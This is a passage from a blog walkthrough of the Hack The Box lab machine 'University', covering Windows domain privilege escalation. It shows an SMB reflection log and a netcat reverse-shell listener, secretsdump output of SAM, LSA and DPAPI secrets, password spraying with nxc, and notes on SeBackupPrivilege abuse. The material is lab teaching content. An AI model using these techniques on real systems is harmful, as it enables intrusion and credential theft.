class="built_in">type</span> 1 authentication from the privileged client</span><br><span class="line">[*] Connected to the SMB server with ip 127.0.0.1 and port 445</span><br><span class="line">[+] SMB Client Auth Context swapped with SYSTEM </span><br><span class="line">[+] RPC Server Auth Context swapped with the Current User</span><br><span class="line">[*] Received DCOM NTLM <span class="built_in">type</span> 3 authentication from the privileged client</span><br><span class="line">[+] SMB reflected DCOM authentication succeeded!</span><br><span class="line">[+] SMB Connect Tree: \\127.0.0.1\c$  success</span><br><span class="line">[+] SMB Create Request File: Program Files\Automation-Scripts\wpad-cache-cleaner.ps1 success</span><br><span class="line">[+] SMB Write Request file: Program Files\Automation-Scripts\wpad-cache-cleaner.ps1 success</span><br><span class="line">[+] SMB Close File success</span><br><span class="line">[+] SMB Tree Disconnect success</span><br></pre></td></tr></table></figure></div>

<p>And now we get a callback to our listener:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wao@LAB-2:~$ nc -nlvp 4455</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 4455)</span><br><span class="line">Connection from 192.168.99.2 63782 received!</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">ws-3\administrator</span><br></pre></td></tr></table></figure></div>


<p>Next we can obtain the local admin hash by copying sam and system hives and performing secretsdump or using mimikatz (but the shell is not so stable.).<br>And we can obtain the hashes:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">$ impacket-secretsdump administrator@192.168.99.2 -hashes :ba76a28db8aaeb636566a414f3e104aa                 </span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Service RemoteRegistry is <span class="keyword">in</span> stopped state</span><br><span class="line">[*] Starting service RemoteRegistry</span><br><span class="line">[*] Target system bootKey: 0xcafb76872642f6bc09dd9e17ae7cddec</span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:ba76a28db8aaeb636566a414f3e104aa:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:71ffc7b2d302f8059b92219e7d7a7ba1:::</span><br><span class="line">sshd:1001:aad3b435b51404eeaad3b435b51404ee:a8bf1bae201f988dc1ca99f1043e11dc:::</span><br><span class="line">[*] Dumping cached domain logon information (domain/username:<span class="built_in">hash</span>)</span><br><span class="line">UNIVERSITY.HTB/Martin.T:$DCC2<span class="variable">$10240</span><span class="comment">#Martin.T#97cacb28b851029449213555226a7dcc: (2025-07-31 11:04:06)</span></span><br><span class="line">UNIVERSITY.HTB/Administrator:$DCC2<span class="variable">$10240</span><span class="comment">#Administrator#d215fbd6ac39c2d0e49628006db4a2ac: (2024-10-21 23:19:28)</span></span><br><span class="line"></span><br><span class="line">[*] Dumping LSA Secrets</span><br><span class="line">[*] <span class="variable">$MACHINE</span>.ACC </span><br><span class="line">UNIVERSITY\WS-3$:aes256-cts-hmac-sha1-96:2f406f2fbc41fc6bdf08c7b49d048b145f595664ed770e33d1210c8ddeea43ed</span><br><span class="line">UNIVERSITY\WS-3$:aes128-cts-hmac-sha1-96:9536bafcc7f0f3eaa75666ce9dda4529</span><br><span class="line">UNIVERSITY\WS-3$:des-cbc-md5:1cd33b8062b9f75e</span><br><span class="line">UNIVERSITY\WS-3$:plain_password_hex:b005e0d4f4724296a7513d11b36ba2e9ccd669eca34e4985f48c9f6aedadd85d0ecbe634ad06cbbba69c304449de31229f57edbcd3fdca31663bdf085685dd8120eaeded1b27d744d2a466a9ec67c03bb6b6cf28f9b36cf0b0f04431f894e72fc46ba1710beb3fd0998078d482066e613084e0d7b3f7275a4098a4c62f5e4a9553eaadbd1f2241666c7cb55622b9d13bbcd2bec24107acfc91abe33844f9b9279d5784265ffae661820d6338ff4b2b6d9b560f9bcb2de02fc2620813c9cdf7944278b479d05d1509355075fa280f93dc31fd18d6fcc61b3e77091dccb9cdb4e7cefa21596d35c38647284377d6428e7c</span><br><span class="line">UNIVERSITY\WS-3$:aad3b435b51404eeaad3b435b51404ee:b51c7661e82feb147afffb324d91af34:::</span><br><span class="line">[*] DefaultPassword </span><br><span class="line">UNIVERSITY\Martin.T:v3ryS0l!dP@sswd<span class="comment">#X</span></span><br><span class="line">[*] DPAPI_SYSTEM </span><br><span class="line">dpapi_machinekey:0x1b8c79e73a9fe233c28cc4336b7ef8a310cf7335</span><br><span class="line">dpapi_userkey:0x83c20b2c903526e92b01436284cfc32babe48018</span><br><span class="line">[*] NL<span class="variable">$KM</span> </span><br><span class="line"> 0000   A9 CF 8B DE AB C8 F3 82  92 9F 69 F3 F8 8B C2 F4   ..........i.....</span><br><span class="line"> 0010   E5 6D AE 0B C5 05 41 8A  B3 3C 6A 24 92 D9 F5 95   .m....A..&lt;j$....</span><br><span class="line"> 0020   BB 90 A6 24 55 AE 8B 6B  7C B5 B2 40 89 52 75 66   ...<span class="variable">$U</span>..k|..@.Ruf</span><br><span class="line"> 0030   0E F1 23 17 89 D5 A2 AD  22 05 F5 D2 7F F6 DC 87   ..<span class="comment">#.....&quot;.......</span></span><br><span class="line">NL<span class="variable">$KM</span>:a9cf8bdeabc8f382929f69f3f88bc2f4e56dae0bc505418ab33c6a2492d9f595bb90a62455ae8b6b7cb5b240895275660ef1231789d5a2ad2205f5d27ff6dc87</span><br><span class="line">[*] Cleaning up... </span><br><span class="line">[*] Stopping service RemoteRegistry</span><br></pre></td></tr></table></figure></div>

<p>We can also see that there is a cleartext password: <code>v3ryS0l!dP@sswd#X</code></p>
<p>We can use this password with nxc to enumerate the users password, and we’ll find password reuse almost on all of them:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">nxc smb 10.10.11.39 -u usernames.txt -p <span class="string">&#x27;v3ryS0l!dP@sswd#X&#x27;</span> --continue-on-success |grep <span class="string">&#x27;[+]&#x27;</span></span><br><span class="line">SMB                      10.10.11.39     445    DC               [+] university.htb\John.D:v3ryS0l!dP@sswd<span class="comment">#X</span></span><br><span class="line">SMB                      10.10.11.39     445    DC               [+] university.htb\George.A:v3ryS0l!dP@sswd<span class="comment">#X</span></span><br><span class="line">SMB                      10.10.11.39     445    DC               [+] university.htb\hana:v3ryS0l!dP@sswd<span class="comment">#X</span></span><br><span class="line">SMB                      10.10.11.39     445    DC               [+] university.htb\karma.watterson:v3ryS0l!dP@sswd<span class="comment">#X</span></span><br><span class="line">SMB                      10.10.11.39     445    DC               [+] university.htb\Alice.Z:v3ryS0l!dP@sswd<span class="comment">#X</span></span><br><span class="line">SMB                      10.10.11.39     445    DC               [+] university.htb\Steven.P:v3ryS0l!dP@sswd<span class="comment">#X</span></span><br><span class="line">SMB                      10.10.11.39     445    DC               [+] university.htb\Karol.J:v3ryS0l!dP@sswd<span class="comment">#X</span></span><br><span class="line">SMB                      10.10.11.39     445    DC               [+] university.htb\Leon.K:v3ryS0l!dP@sswd<span class="comment">#X</span></span><br><span class="line">SMB                      10.10.11.39     445    DC               [+] university.htb\A.Crouz:v3ryS0l!dP@sswd<span class="comment">#X</span></span><br><span class="line">SMB                      10.10.11.39     445    DC               [+] university.htb\Kai.K:v3ryS0l!dP@sswd<span class="comment">#X</span></span><br><span class="line">SMB                      10.10.11.39     445    DC               [+] university.htb\Arnold.G:v3ryS0l!dP@sswd<span class="comment">#X</span></span><br><span class="line">SMB                      10.10.11.39     445    DC               [+] university.htb\Kareem.A:v3ryS0l!dP@sswd<span class="comment">#X</span></span><br><span class="line">SMB                      10.10.11.39     445    DC               [+] university.htb\Lisa.K:v3ryS0l!dP@sswd<span class="comment">#X</span></span><br><span class="line">SMB                      10.10.11.39     445    DC               [+] university.htb\Jakken.C:v3ryS0l!dP@sswd<span class="comment">#X</span></span><br><span class="line">SMB                      10.10.11.39     445    DC               [+] university.htb\Nya.R:v3ryS0l!dP@sswd<span class="comment">#X</span></span><br><span class="line">SMB                      10.10.11.39     445    DC               [+] university.htb\Brose.W:v3ryS0l!dP@sswd<span class="comment">#X</span></span><br><span class="line">SMB                      10.10.11.39     445    DC               [+] university.htb\Choco.L:v3ryS0l!dP@sswd<span class="comment">#X</span></span><br><span class="line">SMB                      10.10.11.39     445    DC               [+] university.htb\Rose.L:v3ryS0l!dP@sswd<span class="comment">#X</span></span><br><span class="line">SMB                      10.10.11.39     445    DC               [+] university.htb\Emma.H:v3ryS0l!dP@sswd<span class="comment">#X</span></span><br><span class="line">SMB                      10.10.11.39     445    DC               [+] university.htb\C.Freez:v3ryS0l!dP@sswd<span class="comment">#X</span></span><br><span class="line">SMB                      10.10.11.39     445    DC               [+] university.htb\Martin.T:v3ryS0l!dP@sswd<span class="comment">#X</span></span><br></pre></td></tr></table></figure></div>

<p>With some enumeration, we can see that brose.w user is part of Backup Operators. You can use this command instead of Bloodhound to check that:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> -r user; <span class="keyword">do</span> bloodyAD --host 10.10.11.39 -u martin.t -p <span class="string">&#x27;v3ryS0l!dP@sswd#X&#x27;</span> -d university.htb get search --filter <span class="string">&quot;sAMAccountName=<span class="variable">$user</span>)&quot;</span> --attr=sAMAccountName,memberOf; <span class="keyword">done</span> &lt; usernames.txt</span><br><span class="line">&lt;snip&gt;</span><br><span class="line">distinguishedName: CN=Brose wayen,CN=Users,DC=university,DC=htb</span><br><span class="line">memberOf: CN=Help Desk,CN=Users,DC=university,DC=htb; CN=Backup Operators,CN=Builtin,DC=university,DC=htb</span><br><span class="line">sAMAccountName: Brose.W</span><br><span class="line">&lt;snip&gt;</span><br></pre></td></tr></table></figure></div>

<p>Now logging in as brose.w, we can see she has SeBackupPrivilege enabled:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\Brose.W\Documents&gt; <span class="built_in">whoami</span> /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== =======</span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span><br><span class="line">SeBackupPrivilege             Back up files and directories  Enabled</span><br><span class="line">SeRestorePrivilege            Restore files and directories  Enabled</span><br><span class="line">SeShutdownPrivilege           Shut down the system           Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working <span class="built_in">set</span> Enabled</span><br></pre></td></tr></table></figure></div>

<p>We can utilize this amazing article: <a class="link"   target="_blank" rel="noopener" href="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/" >https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>to abuse the privilege, dump sam and system and get the admin hash.</p>
<p>And finally, get root flag.</p>
<p>That was it for University, hope you learned something new.</p>
<p>-0xkujen</p>

        </div>

        
            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
                <div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> Hackthebox: University</li>
        <li><strong>Author:</strong> Foued SAIDI</li>
        <li><strong>Created at
                :</strong> 2025-08-08 08:03:44</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-08-08 10:03:46
            </li>
        
        <li>
            <strong>Link:</strong> https://kujen5.github.io/2025/08/08/Hackthebox-University/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

            </div>
        

        

        

        
            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                
                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="prev"
                        rel="prev"
                        href="/2025/08/16/Hackthebox-Nocturnal/"
                        >
                            <span class="left arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-left"></i>
                            </span>
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">Hackthebox: Nocturnal</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="next"
                        rel="next"
                        href="/2025/08/02/Hackthebox-Code/"
                        >
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">Hackthebox: Code</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        


        
    </div>

    
        <div class="toc-content-container">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">On this page</div>
        <div class="page-title">Hackthebox: University</div>
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-university-htb"><span class="nav-text">Web Application - http:&#x2F;&#x2F;university.htb </span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation"><span class="nav-text">Privilege Escalation</span></a></li></ol>

    </div>
</div>
        </div>
    
</div>



                

            </div>

            

        </div>

        <div class="main-content-footer">
            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2023</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
        </div>
        
            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    

</main>


    
<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>







<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>





    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>







<div class="post-scripts" data-swup-reload-script>
    
        
<script src="/js/libs/anime.min.js"></script>

        
<script src="/js/tools/tocToggle.js" type="module"></script>

<script src="/js/layouts/toc.js" type="module"></script>

<script src="/js/plugins/tabs.js" type="module"></script>

    
</div>


</body>
</html>
